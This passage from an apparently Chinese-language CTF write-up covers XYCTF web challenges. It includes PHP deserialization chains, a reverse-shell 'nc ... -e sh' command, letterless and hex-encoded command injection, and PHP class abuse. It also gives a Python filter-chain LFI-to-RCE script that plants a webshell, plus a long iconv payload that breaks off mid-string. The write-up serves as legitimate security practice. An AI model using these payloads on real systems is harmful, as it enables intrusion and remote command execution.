class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;N1ght=<span class="string">&#x27;oSthing&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;KickyMu=<span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;KickyMu-&gt;adwa=<span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;KickyMu-&gt;adwa-&gt;crypto0=<span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;KickyMu-&gt;adwa-&gt;T1ng=<span class="string">&#x27;yuroandCMD258&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:8:&quot;XYCTFNO3&quot;:3:&#123;s:7:&quot;KickyMu&quot;;O:8:&quot;XYCTFNO2&quot;:2:&#123;s:7:&quot;crypto0&quot;;N;s:4:&quot;adwa&quot;;O:8:&quot;stdClass&quot;:2:&#123;s:7:&quot;crypto0&quot;;s:5:&quot;dev1l&quot;;s:4:&quot;T1ng&quot;;s:13:&quot;yuroandCMD258&quot;;&#125;&#125;s:7:&quot;fpclose&quot;;N;s:5:&quot;N1ght&quot;;s:7:&quot;oSthing&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a>ez?Make</h3><h4 id="方法一：利用反弹shell"><a href="#方法一：利用反弹shell" class="headerlink" title="方法一：利用反弹shell"></a>方法一：利用反弹shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`nc ip 端口 -e sh`</span><br><span class="line"></span><br><span class="line">之前一直没能够复现成功，结果竟然是端口的问题，用80端口就可以连接，用其他的端口就连接不了，有点奇怪，我明明把所有的端口都打开了啊，有点不能理解，浪费几个小时</span><br></pre></td></tr></table></figure><img src="image-20240511180037459.png" alt="image-20240511180037459" style="zoom: 50%;" /><h4 id="方法二：通过进制编码绕过"><a href="#方法二：通过进制编码绕过" class="headerlink" title="方法二：通过进制编码绕过"></a>方法二：通过进制编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">`echo 636174202F666c6167 | xxd -r -p`</span><br><span class="line"></span><br><span class="line">前面的十六进制表示 cat /flag  ， 通过 反引号执行 ` ` </span><br><span class="line">(因为f被过滤了，将f大写绕过，不影响命令执行)</span><br><span class="line"></span><br><span class="line">xxd 是一个用于在十六进制和二进制之间进行转换的工具。-r 选项告诉 xxd 将十六进制输入转换为二进制输出（即“reverse”或“reconstruct”）。-p 选项表示输入是纯十六进制（没有地址、偏移或其他信息）</span><br><span class="line"></span><br><span class="line">echo 输出十六进制字符串 636174202F666c6167。</span><br><span class="line">通过管道 |，这个输出被传递给 xxd 命令。</span><br><span class="line">xxd -r -p 将这个十六进制字符串转换为它的二进制表示，并输出相应的ASCII字符。</span><br><span class="line"></span><br><span class="line">//XYCTF&#123;1d61fce7-42f1-4f55-85a8-fdf1fea48cc5&#125;</span><br></pre></td></tr></table></figure><h3 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?"></a>εZ?¿м@Kε¿?</h3><p>（看着wp写，也是有点没看懂，简单记录一下）<br>主要也是学到了 ， $() 能够执行命令， &lt;  能够将东西输入到命令中<br>makefile的特定语法需要 $$</p><img src="image-20240504163649904.png" alt="image-20240504163649904" style="zoom: 50%;" /><img src="image-20240504163941180.png" alt="image-20240504163941180" style="zoom:50%;" /><p><img src="/2024/05/18/XYCTF/image-20240504164032991.png" alt="image-20240504164032991"></p><p><img src="/2024/05/18/XYCTF/image-20240504164135693.png" alt="image-20240504164135693"></p><h3 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>无字母RCE<br>Linux终端可以通过 <code>$&#39;\xxx&#39;</code> 的方式执行命令，xxx是字符ascii码的八进制形式<br>$’\154\163’   &#x3D;&#x3D;&gt;   ls   可以执行<br>但是  $’\154\163\40\57’  &#x3D;&#x3D;&gt; ls &#x2F;   无法执行,会被解析成字符串，无法执行命令<br>所以就需要用到  &lt;&lt;&lt;  在Linux中，“&lt;&lt;&lt;”是一个称为”Here String”的特殊操作符。它的作用是将字符串的内容作为输入传递给命令<br>以及 $0  相当与bash<br><img src="/2024/05/18/XYCTF/image-20240505172919834.png" alt="image-20240505172919834"></p><p>所以 $0&lt;&lt;&lt;$’\154\163\40\57’  就可以执行命令了<br><img src="image-20240505173036667.png" alt="image-20240505173036667" style="zoom:50%;" /></p><p>?cmd&#x3D;$0&lt;&lt;&lt;$’\143\141\164\40\57\146\154\141\147’    &#x3D;&#x3D;&gt;   cat &#x2F;flag   拿到flag</p><p>XYCTF{29b04a5d-c92f-436f-8ea4-6bf693f317de}</p><h3 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure><h4 id="方法一：SplFileObject读取文件"><a href="#方法一：SplFileObject读取文件" class="headerlink" title="方法一：SplFileObject读取文件"></a>方法一：SplFileObject读取文件</h4><p>SplFileObject 加上 php伪协议 读取文件 ， 调用__toString() 方法得到字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get传参：</span><br><span class="line">a=new SplFileObject</span><br><span class="line">aa=php://filter/read=convert.base64-encode/resource=/flag</span><br><span class="line">c=__toString</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/XYCTF/image-20240507163721862.png" alt="image-20240507163721862"></p><p>解密：XYCTF{9801dabe-6702-4f4e-91d5-1d1f4ce2c684}</p><p>这是直接猜在根目录下有一个flag文件，要是把flag文件换个名，就需要读取目录了，但网上搜了一下读目录的<br>DirectoryIterator类 + glob:&#x2F;&#x2F;协议  遍历目录，但没能成功，读不到目录，可能不适合这道题或者我哪里搞错了，有点懵</p><h4 id="方法二-Error的getMessage"><a href="#方法二-Error的getMessage" class="headerlink" title="方法二 : Error的getMessage"></a>方法二 : Error的getMessage</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以输出system</span></span><br></pre></td></tr></table></figure><p>所以get传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=Error&amp;aa=system&amp;b=Error&amp;bb=cat /flag&amp;c=getMessage</span><br></pre></td></tr></table></figure><h3 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在index.php中可以看到代码</span><br><span class="line">&lt;?php include_once($_REQUEST[&#x27;file&#x27;]);</span><br></pre></td></tr></table></figure><p>直接现成的脚本，把地址写上去，直接输出了flag<br>（这道题之前倒是做过类似的，绕过  include_once();  ，但是原理方面不太理解）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://gz.imxbt.cn:20208/&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;/readflag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#XYCTF&#123;878ce487-4b88-4683-ae70-7cfd8af42803&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/XYCTF/image-20240507175947909.png" alt="image-20240507175947909"></p><h3 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h3><p>打开index.php文件</p><p><img src="/2024/05/18/XYCTF/image-20240508140634745.png" alt="image-20240508140634745"></p><p>进入到what’s_this.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><p>需要用伪协议构造一个 XYCTF<br>用这个项目，运行生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">第一种方法：</span><br><span class="line">需要将XYCTF进行几次 base64编码</span><br><span class="line">命令：</span><br><span class="line">python php_filter_chain_generator.py --chain &#x27;Vm1wQ1lXTXhTa2RYYTFwWVZWRQ&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Vm1wQ1lXTXhTa2RYYTFwWVZWRQ  ---&gt; XYCTF （5次base64解码）</span><br><span class="line"></span><br><span class="line">但是 XYCTF 五次 base64编码只能得到  --&gt;   Vm1wQ1lXTXhTa2RYYTFwWVZrUkJPUT09</span><br><span class="line">用这个去运行的话却不能得到flag（感觉不应该啊），刚开始没注意一直弄不出来，也不知道 Vm1wQ1lXTXhTa2RYYTFwWVZWRQ 是怎么来的</span><br><span class="line">不过 Vm1wQ1lXTXhTa2RYYTFwWVZr 就可以base64解码成 XYCTF </span><br><span class="line">（先暂时放着）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二种方法：</span><br><span class="line">python3 php_filter_chain_generator.py --chain &#x27;XYCTF&lt;&#x27;</span><br><span class="line"></span><br><span class="line">然后复制下payload之后，使用string.strip_tags过滤器绕过</span><br><span class="line">strip_tags ：从字符串中去除 HTML 和 PHP 标签</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/XYCTF/image-20240508151727705.png" alt="image-20240508151727705"></p><p>得到的结果还需要进行解码，编码了几次就需要解码几次<br><img src="/2024/05/18/XYCTF/image-20240508155619570.png" alt="image-20240508155619570"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line"></span><br><span class="line">?p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|con